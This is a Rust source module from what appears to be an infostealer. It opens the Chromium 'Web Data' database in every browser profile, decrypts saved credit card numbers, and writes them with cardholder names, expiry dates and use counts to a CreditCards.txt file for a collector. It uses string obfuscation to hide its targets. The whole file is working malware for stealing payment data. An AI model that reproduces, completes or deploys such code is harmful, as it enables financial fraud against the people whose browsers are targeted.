use crate::alloc::borrow::ToOwned;
use crate::chromium::{decrypt_data, BrowserData};
use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, CreditCard};
use alloc::sync::Arc;
use collector::{Browser, Collector};
use database::TableRecord;
use obfstr::obfstr as s;
use tasks::{parent_name, Task};
use utils::path::Path;

const CREDIT_CARDS_NAME_ON_CARD: usize = 1;
const CREDIT_CARDS_EXPIRATION_MONTH: usize = 2;
const CREDIT_CARDS_EXPIRATION_YEAR: usize = 3;
const CREDIT_CARDS_CARD_NUMBER: usize = 4;
const CREDIT_CARDS_USE_COUNT: usize = 7;

pub(super) struct CreditCardsTask {
    browser: Arc<BrowserData>
}

impl CreditCardsTask {
    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
        Self { browser }
    }
}

impl<C: Collector> Task<C> for CreditCardsTask {
    parent_name!("CreditCards.txt");

    unsafe fn run(&self, parent: &Path, collector: &C) {
        let Some(mut credit_cards) = collect_and_read_sqlite_from_all_profiles(
            &self.browser.profiles,
            |profile| profile / s!("Web Data"),
            s!("Credit_cards"),
            |record| extract_card_from_record(record, &self.browser)
        ) else {
            return
        };
        
        credit_cards.sort_by(|a, b| b.use_count.cmp(&a.use_count));
        collector.browser().increase_credit_cards_by(credit_cards.len());
        let _ = to_string_and_write_all(&credit_cards, "\n\n", parent);
    }
}

fn extract_card_from_record(record: &dyn TableRecord, browser_data: &BrowserData) -> Option<CreditCard> {
    let name_on_card = record.get_value(CREDIT_CARDS_NAME_ON_CARD)?.as_string()?.to_owned();
    let expiration_month = record.get_value(CREDIT_CARDS_EXPIRATION_MONTH)?.as_integer()?;
    let expiration_year = record.get_value(CREDIT_CARDS_EXPIRATION_YEAR)?.as_integer()?;
    let use_count = record.get_value(CREDIT_CARDS_USE_COUNT)?.as_integer()?;
    
    let encrypted_card_number = record.get_value(CREDIT_CARDS_CARD_NUMBER)?.as_blob()?;
    let card_number = unsafe { decrypt_data(encrypted_card_number, browser_data) }?;
    
    Some(CreditCard {
        name_on_card,
        expiration_month,
        expiration_year,
        card_number,
        use_count
    })
}